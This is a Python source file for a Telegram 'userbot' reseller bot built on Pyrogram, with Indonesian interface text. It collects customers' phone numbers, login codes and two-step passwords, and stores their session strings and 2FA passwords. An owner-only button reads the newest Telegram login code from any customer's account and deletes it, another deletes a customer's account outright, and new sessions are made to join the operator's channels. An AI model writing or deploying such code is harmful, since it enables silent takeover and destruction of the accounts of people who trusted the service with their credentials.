import asyncio
import importlib
from datetime import datetime

from pyrogram.enums import SentCodeType
from pyrogram.errors import *
from pyrogram.types import *
from pyrogram.raw import functions

from PyroUbot import *


@PY.BOT("start")
@PY.START
@PY.PRIVATE
async def _(client, message):
    buttons = BTN.START(message)
    msg = MSG.START(message)
    await message.reply(msg, reply_markup=InlineKeyboardMarkup(buttons))


@PY.CALLBACK("bahan")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id in ubot._get_my_id:
        buttons = [
            [InlineKeyboardButton("✅ ʀᴇꜱᴛᴀʀᴛ", callback_data=f"ress_ubot")],
            # [ikb("| test - ress_ubot |")],
            [InlineKeyboardButton("⬅️ ᴋᴇᴍʙᴀʟɪ", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""
<blockquote><b>🔴ᴀɴᴅᴀ ꜱᴜᴅᴀʜ ᴍᴇᴍʙᴜᴀᴛ/ᴍᴇᴍɪʟɪᴋɪ ᴜꜱᴇʀʙᴏᴛ!\nᴊɪᴋᴀ ᴜꜱᴇʀʙᴏᴛ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴅɪ ɢᴜɴᴀᴋᴀɴ/ᴍᴇʀᴇꜱᴘᴏɴ ꜱɪʟᴀʜᴋᴀɴ ᴘᴇɴᴄᴇᴛ ᴛᴏᴍʙᴏʟ ʀᴇꜱᴛᴀʀᴛ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ</b></blockquote>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    elif len(ubot._ubot) + 1 > MAX_BOT:
        buttons = [
            [InlineKeyboardButton("🔙 ᴋᴇᴍʙᴀʟɪ", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""
<blockquote><b>❌ ᴛɪᴅᴀᴋ ʙɪsᴀ ᴍᴇᴍʙᴜᴀᴛ ᴜsᴇʀʙᴏᴛ!</b>
<b>ᴋᴀʀᴇɴᴀ ᴍᴀᴋsɪᴍᴀʟ ᴜsᴇʀʙᴏᴛ ᴀᴅᴀʟᴀʜ {Fonts.smallcap(str(len(ubot._ubot)))}</b>

<b>☎️ ʜᴜʙᴜɴɢɪ: <a href=tg://openmessage?user_id={OWNER_ID}>ᴀᴅᴍɪɴ</a></b></blockquote>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    if user_id not in await get_list_from_vars(client.me.id, "PREM_USERS"):
        buttons = [
            [InlineKeyboardButton("✅ ʟᴀɴᴊᴜᴛᴋᴀɴ", callback_data="bayar_dulu")],
            [InlineKeyboardButton("🔙 ᴋᴇᴍʙᴀʟɪ", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            MSG.POLICY(),
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    else:
        buttons = [[InlineKeyboardButton("✅ ʟᴀɴᴊᴜᴛᴋᴀɴ", callback_data="buat_ubot")]]
        return await callback_query.edit_message_text(
            """
<blockquote><b>‼️ ᴀɴᴅᴀ ᴛᴇʟᴀʜ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴘᴇᴍʙᴇʟɪᴀɴ ᴜꜱᴇʀʙᴏᴛ!\nꜱɪʟᴀʜᴋᴀɴ ʟᴀɴᴊᴜᴛᴋᴀɴ ꜱᴀᴊᴀ ᴜɴᴛᴜᴋ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴘᴇᴍᴀꜱᴀɴɢᴀɴ ᴜꜱᴇʀʙᴏᴛ</b></blockquote>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )


@PY.CALLBACK("status")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id in ubot._get_my_id:
        buttons = [
            [InlineKeyboardButton("🔙 ᴋᴇᴍʙᴀʟɪ", callback_data=f"home {user_id}")],
        ]
        exp = await get_expired_date(user_id)
        prefix = await get_pref(user_id)
        waktu = exp.strftime("%d-%m-%Y") if exp else "None"
        return await callback_query.edit_message_text(
            f"""
<blockquote><b>🤖 ᴜʟᴛʀᴀᴘʀᴇᴍ ᴜʙᴏᴛ</b>
 <b>sᴛᴀᴛᴜs :</b> <code>ᴘʀᴇᴍɪᴜᴍ</code>
 <b>ᴘʀᴇғɪxᴇs :</b> <code>{prefix[0]}</code>
 <b>ᴇxᴘɪʀᴇᴅ_ᴏɴ :</b> <code>{waktu}</code></blockquote>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    else:
        buttons = [
            [InlineKeyboardButton("💎 ʙᴇʟɪ ᴜsᴇʀʙᴏᴛ 💎", callback_data=f"bahan")],
            [InlineKeyboardButton("🔙 ᴋᴇᴍʙᴀʟɪ", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""
<blockquote><b>‼️ ᴀɴᴅᴀ ʙᴇʟᴜᴍ ᴍᴇᴍɪʟɪᴋɪ/ᴍᴇᴍʙᴇʟɪ ᴜꜱᴇʀʙᴏᴛ ɪɴɪ!\nꜱɪʟᴀʜᴋᴀɴ ᴍᴇᴍʙᴇʟɪ ᴜꜱᴇʀʙᴏᴛ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ ᴀɢᴀʀ ᴍᴇᴍɪʟɪᴋɪ ᴜʙᴏᴛ</b></blockquote>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
    )


@PY.CALLBACK("buat_ubot")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id in ubot._get_my_id:
        buttons = [
            [InlineKeyboardButton("✅ ʀᴇꜱᴛᴀʀᴛ", callback_data=f"ress_ubot")],
            [InlineKeyboardButton("⬅️ ᴋᴇᴍʙᴀʟɪ", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""
<blockquote><b>🔴ᴀɴᴅᴀ ꜱᴜᴅᴀʜ ᴍᴇᴍʙᴜᴀᴛ/ᴍᴇᴍɪʟɪᴋɪ ᴜꜱᴇʀʙᴏᴛ!\nᴊɪᴋᴀ ᴜꜱᴇʀʙᴏᴛ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴅɪ ɢᴜɴᴀᴋᴀɴ/ᴍᴇʀᴇꜱᴘᴏɴ ꜱɪʟᴀʜᴋᴀɴ ᴘᴇɴᴄᴇᴛ ᴛᴏᴍʙᴏʟ ʀᴇꜱᴛᴀʀᴛ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ</b></blockquote>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    elif len(ubot._ubot) + 1 > MAX_BOT:
        buttons = [
            [InlineKeyboardButton("🔙 ᴋᴇᴍʙᴀʟɪ", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""
<blockquote><b>❌ ᴛɪᴅᴀᴋ ʙɪsᴀ ᴍᴇᴍʙᴜᴀᴛ ᴜsᴇʀʙᴏᴛ!</b>
<b>ᴋᴀʀᴇɴᴀ ᴍᴀᴋsɪᴍᴀʟ ᴜsᴇʀʙᴏᴛ ᴀᴅᴀʟᴀʜ {Fonts.smallcap(str(len(ubot._ubot)))}</b>

<b>☎️ ʜᴜʙᴜɴɢɪ: <a href=tg://openmessage?user_id={OWNER_ID}>ᴀᴅᴍɪɴ</a></b></blockquote>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    if user_id not in await get_list_from_vars(client.me.id, "PREM_USERS"):
        buttons = [
            [InlineKeyboardButton("💎 ʙᴇʟɪ ᴜsᴇʀʙᴏᴛ", callback_data="bahan")],
            [InlineKeyboardButton("🔙 ᴋᴇᴍʙᴀʟɪ", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""
<blockquote><b>❌ ᴍᴀᴀꜰ ᴀɴᴅᴀ ʙᴇʟᴜᴍ ᴍᴀʟᴀᴋᴜᴋᴀɴ ᴘᴇᴍʙᴇʟɪᴀɴ ᴜꜱᴇʀʙᴏᴛ!\nꜱɪʟᴀʜᴋᴀɴ ᴍᴇᴍʙᴇʟɪ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ ʟᴀʟᴜ ʙᴜᴀᴛʟᴀʜ ᴜꜱᴇʀʙᴏᴛ</b></blockquote>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    else:
        buttons = [[InlineKeyboardButton("✅ ʟᴀɴᴊᴜᴛᴋᴀɴ", callback_data="add_ubot")]]
        return await callback_query.edit_message_text(
            """
<blockquote><b>💬 ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴜᴀᴛ ᴜsᴇʀʙᴏᴛ sɪᴀᴘᴋᴀɴ ʙᴀʜᴀɴ ʙᴇʀɪᴋᴜᴛ</b>

    <b>>• <code>ᴘʜᴏɴᴇ_ɴᴜᴍʙᴇʀ</code>: ɴᴏᴍᴇʀ ʜᴘ ᴀᴋᴜɴ ᴛᴇʟᴇɢʀᴀᴍ</b>

<b>☑️ ᴊɪᴋᴀ sᴜᴅᴀʜ ᴛᴇʀsᴇᴅɪᴀ sɪʟᴀʜᴋᴀɴ ᴋʟɪᴋ ᴛᴏᴍʙᴏɪ ᴅɪʙᴀᴡᴀʜ</b></blockquote>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )


@PY.CALLBACK("bayar_dulu")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    buttons = BTN.PLUS_MINUS(1, user_id)
    return await callback_query.edit_message_text(
        MSG.TEXT_PAYMENT(30, 30, 1),
        disable_web_page_preview=True,
        reply_markup=InlineKeyboardMarkup(buttons),
    )


@PY.CALLBACK("add_ubot")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    await callback_query.message.delete()
    try:
        phone = await bot.ask(
            user_id,
            (
                "<blockquote><b>sɪʟᴀʜᴋᴀɴ ᴍᴀsᴜᴋᴋᴀɴ ɴᴏᴍᴏʀ ᴛᴇʟᴇᴘᴏɴ ᴛᴇʟᴇɢʀᴀᴍ ᴀɴᴅᴀ ᴅᴇɴɢᴀɴ ꜰᴏʀᴍᴀᴛ ᴋᴏᴅᴇ ɴᴇɢᴀʀᴀ!\nᴄᴏɴᴛᴏʜ: +628xxxxxxx</b>\n"
                "\n<b>ɢᴜɴᴀᴋᴀɴ /cancel ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴀᴛᴀʟᴋᴀɴ ᴘʀᴏsᴇs</b></blockquote>"
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "<blockquote><b>ᴘᴇᴍʙᴀᴛᴀʟᴀɴ ᴏᴛᴏᴍᴀᴛɪꜱ!\nɢᴜɴᴀᴋᴀɴ /ꜱᴛᴀʀᴛ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴜʟᴀɴɢ</b></blockquote>")
    if await is_cancel(callback_query, phone.text):
        return
    phone_number = phone.text
    new_client = Ubot(
        name=str(callback_query.id),
        api_id=API_ID,
        api_hash=API_HASH,
        in_memory=False,
    )
    get_otp = await bot.send_message(user_id, "<blockquote><b>ᴍᴇɴɢɪʀɪᴍ ᴋᴏᴅᴇ ᴏᴛᴘ...</b></blockquote>")
    await new_client.connect()
    try:
        code = await new_client.send_code(phone_number.strip())
    except ApiIdInvalid as AID:
        await get_otp.delete()
        return await bot.send_message(user_id, AID)
    except PhoneNumberInvalid as PNI:
        await get_otp.delete()
        return await bot.send_message(user_id, PNI)
    except PhoneNumberFlood as PNF:
        await get_otp.delete()
        return await bot.send_message(user_id, PNF)
    except PhoneNumberBanned as PNB:
        await get_otp.delete()
        return await bot.send_message(user_id, PNB)
    except PhoneNumberUnoccupied as PNU:
        await get_otp.delete()
        return await bot.send_message(user_id, PNU)
    except Exception as error:
        await get_otp.delete()
        return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    try:
        sent_code = {
            SentCodeType.APP: "<a href=tg://openmessage?user_id=777000>ᴀᴋᴜɴ ᴛᴇʟᴇɢʀᴀᴍ</a> ʀᴇsᴍɪ",
            SentCodeType.SMS: "sᴍs ᴀɴᴅᴀ",
            SentCodeType.CALL: "ᴘᴀɴɢɢɪʟᴀɴ ᴛᴇʟᴘᴏɴ",
            SentCodeType.FLASH_CALL: "ᴘᴀɴɢɢɪʟᴀɴ ᴋɪʟᴀᴛ ᴛᴇʟᴇᴘᴏɴ",
            SentCodeType.FRAGMENT_SMS: "ꜰʀᴀɢᴍᴇɴᴛ sᴍs",
            SentCodeType.EMAIL_CODE: "ᴇᴍᴀɪʟ ᴀɴᴅᴀ",
        }
        await get_otp.delete()
        otp = await bot.ask(
            user_id,
            (
                f"<blockquote><b>sɪʟᴀᴋᴀɴ ᴘᴇʀɪᴋsᴀ ᴋᴏᴅᴇ ᴏᴛᴘ ᴅᴀʀɪ {sent_code[code.type]}. ᴋɪʀɪᴍ ᴋᴏᴅᴇ ᴏᴛᴘ ᴋᴇ sɪɴɪ sᴇᴛᴇʟᴀʜ ᴍᴇᴍʙᴀᴄᴀ ꜰᴏʀᴍᴀᴛ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ.</b>\n"
                "<b>ᴊɪᴋᴀ ᴋᴏᴅᴇ ᴏᴛᴘ ᴀᴅᴀʟᴀʜ: <code>12345</code>\nᴋɪʀɪᴍᴋᴀɴ sᴇᴘᴇʀᴛɪ ɪɴɪ: <code>1 2 3 4 5</code></b>\n"
                "\n<b>ɢᴜɴᴀᴋᴀɴ /cancel ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴀᴛᴀʟᴋᴀɴ ᴘʀᴏsᴇs</b></blockquote>"
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "<blockquote><b>ᴘᴇᴍʙᴀᴛᴀʟᴀɴ ᴏᴛᴏᴍᴀᴛɪꜱ!\nɢᴜɴᴀᴋᴀɴ /ꜱᴛᴀʀᴛ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴜʟᴀɴɢ</b></blockquote>")
    if await is_cancel(callback_query, otp.text):
        return
    otp_code = otp.text
    try:
        await new_client.sign_in(
            phone_number.strip(),
            code.phone_code_hash,
            phone_code=" ".join(str(otp_code)),
        )
    except PhoneCodeInvalid as PCI:
        return await bot.send_message(user_id, PCI)
    except PhoneCodeExpired as PCE:
        return await bot.send_message(user_id, PCE)
    except BadRequest as error:
        return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    except SessionPasswordNeeded:
        try:
            two_step_code = await bot.ask(
                user_id,
                "<blockquote><b>ᴀᴋᴜɴ ᴀɴᴅᴀ ᴛᴇʟᴀʜ ᴍᴇɴɢᴀᴋᴛɪꜰᴋᴀɴ ᴠᴇʀɪꜰɪᴋᴀsɪ ᴅᴜᴀ ʟᴀɴɢᴋᴀʜ. sɪʟᴀʜᴋᴀɴ ᴋɪʀɪᴍᴋᴀɴ ᴘᴀssᴡᴏʀᴅɴʏᴀ.\n\nɢᴜɴᴀᴋᴀɴ /cancel ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴀᴛᴀʟᴋᴀɴ ᴘʀᴏsᴇs</b></blockquote>",
                timeout=300,
            )
        except asyncio.TimeoutError:
            return await bot.send_message(user_id, "<blockquote><b>ᴘᴇᴍʙᴀᴛᴀʟᴀɴ ᴏᴛᴏᴍᴀᴛɪꜱ!\nɢᴜɴᴀᴋᴀɴ /ꜱᴛᴀʀᴛ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴜʟᴀɴɢ</b></blockquote>")
        if await is_cancel(callback_query, two_step_code.text):
            return
        new_code = two_step_code.text
        try:
            await new_client.check_password(new_code)
            await set_two_factor(user_id, new_code)
        except Exception as error:
            return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    session_string = await new_client.export_session_string()
    await new_client.disconnect()
    new_client.storage.session_string = session_string
    new_client.in_memory = False
    bot_msg = await bot.send_message(
        user_id,
        "<blockquote>sᴇᴅᴀɴɢ ᴍᴇᴍᴘʀᴏsᴇs....\n\nsɪʟᴀʜᴋᴀɴ ᴛᴜɴɢɢᴜ sᴇʙᴇɴᴛᴀʀ</blockquote>",
        disable_web_page_preview=True,
    )
    await new_client.start()
    if not user_id == new_client.me.id:
        ubot._ubot.remove(new_client)
        await rem_two_factor(new_client.me.id) 
        return await bot_msg.edit(
            "<blockquote><b>ʜᴀʀᴀᴘ ɢᴜɴᴀᴋᴀɴ ɴᴏᴍᴇʀ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴋᴜɴ ᴀɴᴅᴀ!\nᴅᴀɴ ʙᴜᴋᴀɴ ɴᴏᴍᴇʀ ᴛᴇʟᴇɢʀᴀᴍ ᴅᴀʀɪ ᴀᴋᴜɴ ʟᴀɪɴ</b></blockquote>"
        )
    await add_ubot(
        user_id=int(new_client.me.id),
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=session_string,
    )
    await remove_from_vars(client.me.id, "PREM_USERS", user_id)
    for mod in loadModule():
        importlib.reload(importlib.import_module(f"PyroUbot.modules.{mod}"))
    SH = await ubot.get_prefix(new_client.me.id)
    buttons = [
            [InlineKeyboardButton("🔙 ᴋᴇᴍʙᴀʟɪ", callback_data=f"home {user_id}")],
        ]
    text_done = f"""
<blockquote><b>🤖 ᴜsᴇʀʙᴏᴛ ᴅɪᴀᴋᴛɪғᴋᴀɴ</b>
 <b>ɴᴀᴍᴇ :</b> <a href=tg://user?id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a>
 <b>ɪᴅ :</b> <code>{new_client.me.id}</code>
 <b>ᴘʀᴇғɪxᴇs :</b> <code>{' '.join(SH)}</code>
 <b>ᴇxᴘɪʀᴇᴅ :</b></blockquote>
        """
    await bot_msg.edit(text_done, disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons))
    await bash("rm -rf *session*")
    await install_my_peer(new_client)
    try:
        await new_client.join_chat("ZacnnSupport")
        await new_client.join_chat("storekueren")
    except UserAlreadyParticipant:
        pass
    

async def is_cancel(callback_query, text):
    if text.startswith("/cancel"):
        await bot.send_message(
            callback_query.from_user.id, "<blockquote><b>ᴍᴇᴍʙᴀᴛᴀʟᴋᴀɴ ᴘʀᴏꜱᴇꜱ!\n\nɢᴜɴᴀᴋᴀɴ: /ꜱᴛᴀʀᴛ ᴜɴᴛᴜᴋ ᴍᴜᴀʟᴀɪ ᴋᴇᴍʙᴀʟɪ</b></blockquote>"
        )
        return True
    return False


@PY.BOT("control")
async def _(client, message):
    buttons = [
            [InlineKeyboardButton("ʀᴇꜱᴛᴀʀᴛ", callback_data=f"res_ubot")],
        ]
    await message.reply(
            f"""
<blockquote><b>💬 ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʀᴇꜱᴛᴀʀᴛ?!
ᴊɪᴋᴀ ɪʏᴀ ᴘᴇɴᴄᴇᴛ ᴛᴏᴍʙᴏʟ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ</b></blockquote>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )


@PY.BOT("restart")
async def _(client, message):
    buttons = [
            [InlineKeyboardButton("ʀᴇꜱᴛᴀʀᴛ", callback_data=f"res_ubot")],
        ]
    await message.reply(
            f"""
<b>💬 ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʀᴇꜱᴛᴀʀᴛ?!
ᴊɪᴋᴀ ɪʏᴀ ᴘᴇɴᴄᴇᴛ ᴛᴏᴍʙᴏʟ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ</b>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
    )


@PY.CALLBACK("res_ubot")
async def _(client, callback_query):
    if callback_query.from_user.id not in ubot._get_my_id:
        return await callback_query.answer(
            f"ᴛᴏᴍʙᴏʟ ɪɴɪ ʙᴜᴋᴀɴ ᴜɴᴛᴜᴋ ᴍᴜ",
            True,
        )
    for X in ubot._ubot:
        if callback_query.from_user.id == X.me.id:
            for _ubot_ in await get_userbots():
                if X.me.id == int(_ubot_["name"]):
                    try:
                        ubot._ubot.remove(X)
                        ubot._get_my_id.remove(X.me.id)
                        UB = Ubot(**_ubot_)
                        await UB.start()
                        for mod in loadModule():
                            importlib.reload(
                                importlib.import_module(f"PyroUbot.modules.{mod}")
                            )
                        return await callback_query.edit_message_text(
                            f"<b>✅ ʀᴇꜱᴛᴀʀᴛ ʙᴇʀʜᴀꜱɪʟ ᴅɪ ʟᴀᴋᴜᴋᴀɴ!\n\n ɴᴀᴍᴇ: {UB.me.first_name} {UB.me.last_name or ''} | {UB.me.id}</b>"
                        )
                    except Exception as error:
                        return await callback_query.edit_message_text(f"<b>{error}</b>")


@PY.CALLBACK("getubot")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    mmk = await MSG.UBOT(0)
    if user_id not in await get_list_from_vars(client.me.id, "ADMIN_USERS"):
        return await callback_query.answer("ᴛᴏᴍʙᴏʟ ɪɴɪ ʙᴜᴋᴀɴ ᴜɴᴛᴜᴋ ʟᴜ", True)
    await callback_query.edit_message_text(
        mmk,
        reply_markup=InlineKeyboardMarkup(BTN.UBOT(ubot._ubot[0].me.id, 0)),
    )


@PY.CALLBACK("^(get_otp|ub_deak|deak_akun)")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    query = callback_query.data.split()
    if not user_id == OWNER_ID:
        return await callback_query.answer(
            f"❌ ᴛᴏᴍʙᴏʟ ɪɴɪ ʙᴜᴋᴀɴ ᴜɴᴛᴜᴋ ᴍᴜ {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    X = ubot._ubot[int(query[1])]
    if query[0] == "get_otp":
        async for otp in X.search_messages(777000, limit=1):
            try:
                if not otp.text:
                    await callback_query.answer("❌ ᴋᴏᴅᴇ ᴏᴛᴘ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ", True)
                else:
                    await callback_query.edit_message_text(
                        otp.text,
                        reply_markup=InlineKeyboardMarkup(
                            BTN.UBOT(X.me.id, int(query[1]))
                        ),
                    )
                    await X.delete_messages(X.me.id, otp.id)
            except Exception as error:
                return await callback_query.answer(error, True)
    elif query[0] == "ub_deak":
        return await callback_query.edit_message_reply_markup(
            reply_markup=InlineKeyboardMarkup(BTN.DEAK(X.me.id, int(query[1])))
        )
    elif query[0] == "deak_akun":
        ubot._ubot.remove(X)
        await X.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
        return await callback_query.answer(f"✅ ʙᴇʀʜᴀꜱɪʟ ᴅɪ ʜᴀᴘᴜꜱ ᴅᴀʀɪ ᴛᴇʟᴇɢʀᴀᴍ", True)


@PY.CALLBACK("cek_masa_aktif")
async def _(client, callback_query):
    user_id = int(callback_query.data.split()[1])
    expired = await get_expired_date(user_id)
    try:
        xxxx = (expired - datetime.now()).days
        return await callback_query.answer(f"⏳ ᴛɪɴɢɢᴀʟ {xxxx} ʜᴀʀɪ ʟᴀɢɪ", True)
    except:
        return await callback_query.answer("✅ sᴜᴅᴀʜ ᴛɪᴅᴀᴋ ᴀᴋᴛɪғ", True)


@PY.CALLBACK("del_ubot")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id not in await get_list_from_vars(client.me.id, "ADMIN_USERS"):
        return await callback_query.answer(
            f"❌ ᴛᴏᴍʙᴏʟ ɪɴɪ ʙᴜᴋᴀɴ ᴜɴᴛᴜᴋ ᴍᴜ {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    try:
        show = await bot.get_users(callback_query.data.split()[1])
        get_id = show.id
        get_mention = f"{get_id}"
    except Exception:
        get_id = int(callback_query.data.split()[1])
        get_mention = f"{get_id}"
    for X in ubot._ubot:
        if get_id == X.me.id:
            await X.unblock_user(bot.me.username)
            await remove_ubot(X.me.id)
            await rem_expired_date(X.me.id)
            ubot._get_my_id.remove(X.me.id)
            ubot._ubot.remove(X)
            await X.log_out()
            await callback_query.answer(
                f"✅ {get_mention} ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs ᴅᴀʀɪ ᴅᴀᴛᴀʙᴀsᴇ", True
            )
            await callback_query.edit_message_text(
                await MSG.UBOT(0),
                reply_markup=InlineKeyboardMarkup(
                    BTN.UBOT(ubot._ubot[0].me.id, 0)
                ),
            )
            await bot.send_message(
                X.me.id,
                MSG.EXP_MSG_UBOT(X),
                reply_markup=InlineKeyboardMarkup(BTN.EXP_UBOT()),
            )

    
@PY.CALLBACK("^(p_ub|n_ub)")
async def _(client, callback_query):
    query = callback_query.data.split()
    count = int(query[1])
    if query[0] == "n_ub":
        if count == len(ubot._ubot) - 1:
            count = 0
        else:
            count += 1
    elif query[0] == "p_ub":
        if count == 0:
            count = len(ubot._ubot) - 1
        else:
            count -= 1
    await callback_query.edit_message_text(
        await MSG.UBOT(count),
        reply_markup=InlineKeyboardMarkup(
            BTN.UBOT(ubot._ubot[count].me.id, count)
        ),
    )
